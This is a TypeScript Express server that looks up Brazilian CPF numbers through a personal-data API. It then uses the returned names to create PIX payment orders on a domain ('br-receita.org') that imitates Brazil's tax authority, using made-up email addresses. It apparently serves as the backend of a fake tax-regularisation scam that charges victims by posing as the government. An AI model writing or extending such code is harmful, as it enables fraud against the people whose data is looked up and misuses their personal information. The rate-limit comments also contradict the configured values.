// src/index.ts
import express, {
    Router,
    Request,
    Response,
    NextFunction,
    RequestHandler
  } from 'express';
  import dotenv from 'dotenv';
dotenv.config();  
  const app = express();
  const port = process.env.PORT || 3000;
  import cors from 'cors';
import rateLimit from 'express-rate-limit';
  app.use(express.json());
  app.use(cors(
    {
        origin: '*'
    }
));

  app.set('trust proxy', 1)
  const consultaRouter: Router = Router();

  const cpfLimiter = rateLimit({
    windowMs: 60 * 1000, // 15 minutos
    max: 10,                  // max 60 requests por IP
    standardHeaders: true,    // retorna infos em RateLimit-* headers
    legacyHeaders: false,     // desativa X-RateLimit-* headers
  });
  const cpfConsulta = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    
    try {
      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();

      const getOrder = await fetch(
        `https://api-regularizar.br-receita.org/cart/${cartId}/customer`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify({
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email:    `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
          })
     
        }
      );
      if (!getOrder.ok) {
        return res
          .status(getOrder.status)
          .json({ error: `Payment API retornou ${getOrder.status}` });
      }
    
      return res.json(data);
    } catch (err) {
      next(err);
    }


  };


  const cpf = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;

    try {
      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();

    
      return res.json(data);
    } catch (err) {
      next(err);
    }


  };

  const getCartByPlan = async(req: any, res: any, next: any) => {
    console.log('error')
    try {
      const paymentRes = await fetch(
        'https://api-regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg',
        {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          
          }
        }
      );
     console.log(paymentRes)
      if (!paymentRes.ok) {
        return res
          .status(paymentRes.status)
          .json({ error: `Payment API retornou ${paymentRes.status}` });
      }
      const cartId = (await paymentRes.text()).trim(); 
      return res.json({
        cartId
      })
    }catch(err) {
      return res.json(err)
    }
  

  }
  consultaRouter.get('/:cpf/:cartId', cpfLimiter, cpf);
  app.use('/', consultaRouter)
  const customerRouter: Router = Router();
  customerRouter.get('/:cpf/:cartId',cpfLimiter, cpfConsulta);

  app.use('/customer', customerRouter);
  const cartRouter: Router = Router()
  cartRouter.get('/cart', getCartByPlan)
  app.use('/', cartRouter)



  const paymentRouter: Router = Router();
  const payment = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    
    try {
      const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
     

   
      const orderPayload = {
        payment_method: 'pix',
        customer: {
          name:    data.NOME     || 'Nome Exemplo',
          email:    `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
            .replace(/\s+/g, '')                  // tira espaços
            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
            .toLowerCase()}@sememail.com`,
          document: cpf,
          document_type: 'CPF'
        }
      };

     
      const orderRes = await fetch(
        `https://api-regularizar.br-receita.org/cart/${cartId}/order?`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(orderPayload),
        }
      );
      if (!orderRes.ok) {
        console.log(await orderRes.json())
        return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
      }
      const orderData = await orderRes.json();
      return res.json(orderData);
    } catch (err) {
      next(err);
    }
  }

  paymentRouter.get('/:cpf/:cartId', payment);
  app.use("/payment", paymentRouter)
  
  app.listen(port, () => {
    console.log(`🚀 Server rodando em http://localhost:${port}`);
  });
  